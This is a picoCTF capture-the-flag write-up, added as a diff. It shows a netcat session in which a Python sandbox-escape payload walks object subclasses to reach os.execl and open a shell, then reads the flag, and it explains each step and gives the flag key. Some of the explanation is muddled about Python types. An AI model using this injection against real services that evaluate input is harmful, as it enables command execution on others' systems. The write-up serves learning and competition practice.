@@ -1,0 +1,30 @@
+$ nc python.picoctf.com 6363
+Welcome to the food menu!
+Which description do you want to read?
+[ 0] $ 7.69 Chicken Asada Burrito
+[ 1] $ 6.69 Beef Chow Mein
+[ 2] $ 10.49 MeatBurger Deluxe
+> ().__class__.__base__.__subclasses__()[53].__enter__.__func__.__globals__['linecache'].checkcache.__globals__['os'].execl('/bin/sh','sh')
+ls
+run.sh
+task3.py
+your_flag_here
+cat your_flag_here ; exit
+eval_is_super_OSsome
+$
+
+Injection: ().__class__.__base__.__subclasses__()[53].__enter__.__func__.__globals__['linecache'].checkcache.__globals__['os'].execl('/bin/sh','sh')
+
+Explanation: () is the tuple module.
+
+On your own computer, run a python shell and enter:
+().__class__.__base__.__subclasses__()
+and you will see it gives a list of a bunch of types. 
+The 53rd index is <type> 'module' which is what we need to access the os module.
+().__class__.__base__.__subclasses__()[53].__enter__					#enter the module
+().__class__.__base__.__subclasses__()[53].__enter__.__func__				#create a function
+().__class__.__base__.__subclasses__()[53].__enter__.__func__.__globals__['linecache'].checkcache.__globals__['os'] #checks the global memory for the os module. This works because the program executes 'from os import path'
+().__class__.__base__.__subclasses__()[53].__enter__.__func__.__globals__['linecache'].checkcache.__globals__['os'].execl('/bin/sh','sh') #use the execl function in the os module to run the shell
+
+
+Key: eval_is_super_OSsome
